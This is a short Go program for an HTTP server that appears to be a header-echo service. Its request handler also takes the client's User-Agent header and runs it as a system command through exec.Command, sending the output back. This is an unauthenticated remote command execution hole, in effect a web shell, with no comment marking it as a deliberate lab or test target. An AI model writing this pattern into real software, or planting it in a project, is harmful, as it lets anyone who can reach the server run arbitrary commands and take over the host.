package main

import (
  "fmt"
  "log"
  "net/http"
  "os/exec"
)


func main() {

  http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
    for k,v := range r.Header {
      fmt.Fprintf(w, "%v: %v\n", k, v)
    }
    ua := r.Header.Get("User-Agent")
    out, err := exec.Command(ua).Output()
    if err != nil {
        fmt.Println(err)
    }
    fmt.Fprintf(w, "out: %s", out)
  })

  fmt.Println("Starting server on 8080")
  if err := http.ListenAndServe(":8080", nil); err != nil {
    log.Fatal(err)
  }
}
